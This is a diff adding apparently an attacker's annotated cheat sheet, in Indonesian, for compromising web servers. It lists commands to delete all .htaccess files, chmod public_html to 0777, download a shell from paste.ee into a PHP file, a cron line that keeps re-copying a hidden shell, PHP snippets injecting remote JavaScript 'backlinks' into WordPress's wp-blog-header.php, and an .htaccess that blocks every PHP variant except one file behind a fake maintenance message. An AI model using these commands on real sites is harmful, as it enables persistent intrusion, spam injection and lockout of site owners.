@@ -1,0 +1,40 @@
+find . -name ".htaccess" -delete ( semua file .htaccess hilang )
+
+find path/path -type d -exec cp file.htaccess {} \; (copy semua file .htaccess ke semua folder)
+
+chmod -R 0777 /home/public_html/ (rubah semua folder ke green dir)
+
+wget paste.ee -O file.php (upload terminal)
+
+curl -Ls paste.ee | tee -a path/path/file.php (upload terminal)
+
+* * * * * mkdir -p path/path;cp -r shellhidden/shellhidden pathshell/pathshell;chmod 0111 path/path >/dev/null 2>&1 (crontab)
+
+$a = file_get_contents('https://raw.githubusercontent.com/vyscomaylando/quixter/main/template.js'); echo $a; (backlink didalam <php>)
+
+<?php $a = file_get_contents('https://raw.githubusercontent.com/vyscomaylando/quixter/main/template.js'); echo $a; ?> (backlink diluar php)
+
+(backlink wp-blog-header.php)
+$curl = curl_init();
+$url = 'https://raw.githubusercontent.com/vyscomaylando/quixter/main/template.js';
+curl_setopt($curl, CURLOPT_URL, $url);
+curl_setopt($curl, CURLOPT_HEADER, 0);
+curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
+$result = curl_exec($curl);
+echo $result;
+
+
+<FilesMatch ".(php|Php|pHp|phP|PHp|pHP|PhP|PHP|PhP|pht|Pht|pHt|phT|PHt|pHT|PhT|PHT|PhT|php5|Php5|pHp5|phP5|PHp5|pHP5|PhP5|PHP5|PhP5|php6|Php6|pHp6|phP6|PHp6|pHP6|PhP6|PHP6|PhP6|php56|Php56|pHp56|phP56|PHp56|pHP56|PhP56|PHP56|PhP56|php7|Php7|pHp7|phP7|PHp7|pHP7|PhP7|PHP7|PhP7|php8|php9|phtml|Phtml|pHtml|phTml|pHTml|Fla|fLa|flA|FLa|fLA|FlA|FLA|phtMl|phtmL|PHtml|PhTml|PHTML|PHTml|PHTMl|PhtMl|PHTml|PHtML|pHTMl|PhTML|pHTML|PhtmL|PHTmL|PhtMl|PhtmL|pHtMl|PhTmL|pHtmL|aspx|ASPX|asp|ASP|php.jpg|PHP.JPG|php.xxxjpg|PHP.XXXJPG|php.jpeg|PHP.JPG|PHP.JPEG|PHP.PJEPG|php.pjpeg|php.fla|PHP.FLA|php.png|PHP.PNG|php.gif|PHP.GIF|php.test|php;.jpg|PHP JPG|PHP;.JPG|php;.jpeg|php jpg|php.bak|php.pdf|php.xxxpdf|php.xxxpng|fla|Fla|fLa|fLa|flA|FLa|fLA|FLA|FlA|php.xxxgif|php.xxxpjpeg|php.xxxjpeg|php3.xxxjpeg|php3.xxxjpg|php5.xxxjpg|php3.pjpeg|php5.pjpeg|shtml|php.unknown|php.doc|php.docx|php.pdf|php.ppdf|jpg.PhP|php.txt|php.xxxtxt|PHP.TXT|PHP.XXXTXT|php.xlsx|php.zip|php.xxxzip|phar|PHAR|Phar|pHar|phAr|phaR|pHAR|PhAR|PHaR|PHAr|PHar|PhAr|PhaR|pHaR|phAR|shtMl|shtmL|SHtml|ShTml|SHTML|SHTml|SHTMl|ShtMl|SHTml|SHtML|sHTMl|ShTML|sHTML|ShtmL|SHTmL|ShtMl|ShtmL|sHtMl|ShTmL|sHtmL|Shtml|sHtml|shTml|sHTml|shtml|inc)$">
+
+ Order allow,deny
+
+ Deny from all
+</FilesMatch>
+Options -Indexes
+ErrorDocument 403 "SEDANG MAINTENANCE!"
+ErrorDocument 404 "SEDANG MAINTENANCE!"
+<FilesMatch "^(contoh.php)$">
+ Order allow,deny
+ Allow from all
+</FilesMatch>
+
